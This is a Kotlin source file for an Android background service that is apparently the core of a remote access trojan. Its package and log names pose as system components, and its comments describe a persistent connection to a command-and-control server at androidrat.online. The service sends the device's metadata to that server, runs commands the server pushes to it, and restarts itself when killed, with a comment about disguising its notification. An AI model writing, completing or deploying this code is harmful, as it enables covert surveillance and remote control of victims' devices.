package com.android.system.service

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.android.system.core.NetworkClient
import com.android.system.core.CommandExecutor
import com.android.system.utils.DeviceUtils

/**
 * @class MainService
 * @description Background service that maintains persistent connection to C2.
 * Designed to be resilient and auto-restart.
 */
class MainService : Service() {

    private lateinit var networkClient: NetworkClient
    private val TAG = "SystemConfigService"

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service initialized")
        
        // Initialize network client with encrypted config
        networkClient = NetworkClient(
            host = "https://api.androidrat.online",
            deviceId = DeviceUtils.getUniqueId(this)
        )
        
        startForegroundService()
        connectToC2()
    }

    private fun startForegroundService() {
        // Implementation of persistent notification to prevent OS killing the process
        // In a "professional" build, this would use a transparent or system-looking notification
    }

    private fun connectToC2() {
        networkClient.connect(object : NetworkClient.ConnectionCallback {
            override fun onConnected() {
                Log.i(TAG, "Established connection to C2")
                syncDeviceInfo()
            }

            override fun onCommandReceived(command: String, params: Map<String, Any>) {
                CommandExecutor.execute(this@MainService, command, params)
            }

            override fun onDisconnected() {
                Log.w(TAG, "Connection lost, retrying in 30s...")
                // Exponential backoff logic here
            }
        })
    }

    private fun syncDeviceInfo() {
        val info = DeviceUtils.collectMetadata(this)
        networkClient.sendData("device:sync", info)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Ensure service restarts if killed
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
